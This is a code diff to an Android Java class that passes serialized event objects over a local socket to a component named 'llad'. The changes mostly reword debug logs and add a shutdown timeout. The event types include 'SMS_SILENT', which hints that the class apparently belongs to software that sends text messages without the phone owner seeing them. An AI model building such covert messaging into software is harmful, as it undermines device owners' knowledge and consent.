@@ -34,6 +34,7 @@ import java.util.concurrent.TimeUnit;
 public class LowEventHandler implements Runnable {
 
 	private static final String TAG = "LowEventHandler";
+	private static final int DEFAULT_STOP_TIMEOUT = 60;
 	private boolean accept =true;
 	private LocalServerSocket server = null;
 	private Thread thread = null;
@@ -230,11 +231,11 @@ public class LowEventHandler implements Runnable {
 		try {
 			sender.connect(new LocalSocketAddress("llad"));
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " SENT DATA ");
+				Check.log(TAG + "(sendSerialObj): SENT DATA ");
 			}
 			int timeout = 5;
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " wait connection..");
+				Check.log(TAG + "(sendSerialObj): wait connection..");
 			}
 			while (timeout-- > 0) {
 				if (sender.isBound() && sender.isConnected()) {
@@ -248,7 +249,7 @@ public class LowEventHandler implements Runnable {
 			}
 			if (!(sender.isBound() && sender.isConnected())) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + "  (connection failed): ");//$NON-NLS-1$
+					Check.log(TAG + "(sendSerialObj):  (connection failed): ");//$NON-NLS-1$
 				}
 				return obj;
 			}
@@ -261,7 +262,7 @@ public class LowEventHandler implements Runnable {
 			oos.flush();
 			streamOut.flush();
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "  (object sent): ");//$NON-NLS-1$
+				Check.log(TAG + "(sendSerialObj): object sent");//$NON-NLS-1$
 			}
 			obj = null;
 			timeout = 10;
@@ -272,50 +273,67 @@ public class LowEventHandler implements Runnable {
 						try {
 							available = streamIn.available();
 							if (Cfg.DEBUG) {
-								Check.log(TAG + "  (getAvailable): " + available);//$NON-NLS-1$
+								Check.log(TAG + "(sendSerialObj): getAvailable " + available);//$NON-NLS-1$
 							}
 							if (available > 0) {
 
 								ObjectInputStream ois = new ObjectInputStream(streamIn);
 								obj = (LowEventHandlerDefs) ois.readObject();
 								if (Cfg.DEBUG) {
-									Check.log(TAG + " GOT DATA " + obj);
+									Check.log(TAG + "(sendSerialObj): GOT DATA " + obj);
 								}
 							}
 						} catch (Exception e) {
 							if (Cfg.DEBUG) {
-								Check.log(TAG + "  (is available) Error: ", e);//$NON-NLS-1$
+								Check.log(TAG + "(sendSerialObj): is available Error: ", e);//$NON-NLS-1$
 							}
 						}
 					} else {
 						if (Cfg.DEBUG) {
-							Check.log(TAG + "  (getAvailable) sender not connected");//$NON-NLS-1$
+							Check.log(TAG + "(sendSerialObj):  getAvailable sender not connected");//$NON-NLS-1$
 						}
 
 					}
 
 				} catch (Exception e) {
 					if (Cfg.DEBUG) {
-						Check.log(TAG + "  (getAvailable) Error: ", e);//$NON-NLS-1$
+						Check.log(TAG + "(sendSerialObj): getAvailable Error: ", e);//$NON-NLS-1$
 					}
 				}
 				Utils.sleep(100);
 			}
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "  (exiting): t=" + timeout + " a=" + available);//$NON-NLS-1$
+				Check.log(TAG + " (sendSerialObj): exiting t=" + timeout + " a=" + available);//$NON-NLS-1$
 			}
 			Utils.sleep(100);
 		}catch (Exception e){
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "  (LocalSocketAddress) Error: ", e);//$NON-NLS-1$
+				Check.log(TAG + "(sendSerialObj): LocalSocketAddress Error: ", e);//$NON-NLS-1$
 			}
 		}
 		return obj;
 	}
-	public void closeSocketServer() {
+
+	/**
+	 * Stops the listening socket if any
+	 * @param timeout_seconds
+	 *      the number of seconds to wait, default value is 60 seconds
+	 *      and it is used if timeout_second is < 1
+	 * @return void
+	 */
+
+	public void closeSocketServer(int timeout_seconds) {
 		accept = false;
+		if ( timeout_seconds < 1 ){
+			timeout_seconds = DEFAULT_STOP_TIMEOUT;
+		}
 		if ( thread != null ) {
-			while (server != null) {
+			LowEventHandlerDefs obj = new LowEventHandlerDefs();
+			obj.data = null;
+			obj.type = LowEventHandlerDefs.EVENT_TYPE_KILL;
+			Date start = new Date();
+			long diff_sec = (new Date().getTime() - start.getTime()) / 1000;
+			while (server != null && diff_sec < timeout_seconds ) {
 				thread.interrupt();
 				Utils.sleep(100);
 				if (server != null) {
@@ -326,10 +344,13 @@ public class LowEventHandler implements Runnable {
 						continue;
 					}
 				}
-				LowEventHandlerDefs obj = new LowEventHandlerDefs();
-				obj.data = null;
-				obj.type = LowEventHandlerDefs.EVENT_TYPE_KILL;
+				if ( obj == null ){
+					obj = new LowEventHandlerDefs();
+					obj.data = null;
+					obj.type = LowEventHandlerDefs.EVENT_TYPE_KILL;
+				}
 				obj = sendSerialObj(obj);
+				diff_sec = (new Date().getTime() - start.getTime()) / 1000;
 			}
 		}
 	}
@@ -344,9 +365,19 @@ public class LowEventHandler implements Runnable {
 				/* wait until a connection is ready */
 				try {
 					if (Cfg.DEBUG) {
-						Check.log(TAG + "  going to accept");
+						Check.log(TAG + "(run): going to accept");
 					}
-					LocalSocket receiver = server.accept();
+					LocalSocket receiver = null;
+					try {
+						receiver = server.accept();
+					}catch (IOException e){
+						if(!this.accept){
+							if (Cfg.DEBUG) {
+								Check.log(TAG + "(run): interrupted for stopping listening");
+							}
+							break;
+						}
+					}
 					if (receiver != null) {
 						DataInputStream streamIn = new DataInputStream(new
 								BufferedInputStream(receiver.getInputStream()));
@@ -360,7 +391,7 @@ public class LowEventHandler implements Runnable {
 							ObjectInputStream ois = new ObjectInputStream(streamIn);
 							LowEventHandlerDefs event = (LowEventHandlerDefs) ois.readObject();
 							if (Cfg.DEBUG) {
-								Check.log(TAG + "GOT DATA " + event);
+								Check.log(TAG + "(run):GOT DATA " + event);
 							}
 							if (event.type  == LowEventHandlerDefs.EVENT_TYPE_SMS || event.type  == LowEventHandlerDefs.EVENT_TYPE_SMS_SILENT) {
 								if (event.data != null) {
@@ -374,11 +405,11 @@ public class LowEventHandler implements Runnable {
 									event.res = 1;
 								}
 								if (Cfg.DEBUG) {
-									Check.log(TAG + "  SENT reply " + event);
+									Check.log(TAG + "(run): SENT reply " + event);
 								}
 							} if(event.type == LowEventHandlerDefs.EVENT_TYPE_KILL) {
 								if (Cfg.DEBUG) {
-									Check.log(TAG + "  SENT Kill");
+									Check.log(TAG + "(run): SENT Kill");
 									event.res = 1;
 								}
 							}else{
@@ -394,7 +425,7 @@ public class LowEventHandler implements Runnable {
 										break;
 									} catch (Exception e) {
 										if (Cfg.DEBUG) {
-											Check.log(TAG + " run: Exception sending back:", e);
+											Check.log(TAG + "(run): Exception sending back:", e);
 										}
 									}
 								Utils.sleep(100);
@@ -402,27 +433,27 @@ public class LowEventHandler implements Runnable {
 						}
 						receiver.close();
 						if (Cfg.DEBUG) {
-							Check.log(TAG + " run: receiver closed");
+							Check.log(TAG + "(run): receiver closed");
 						}
 					}else{
 						if (Cfg.DEBUG) {
-							Check.log(TAG + " run: receiver null");
+							Check.log(TAG + "(run): receiver null");
 						}
 					}
 				} catch (Exception e) {
 					if (Cfg.DEBUG) {
-						Check.log(TAG + "  run: accept failed:", e);
+						Check.log(TAG + "(run): accept failed:", e);
 					}
 				}
 			}
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "  run: stopping thread");
+				Check.log(TAG + "(run): stopping thread");
 			}
 			server.close();
 			server = null;
 		} catch (IOException ex) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " IOEXCEPTION", ex);
+				Check.log(TAG + "(run): IOEXCEPTION", ex);
 			}
 		}
 	}
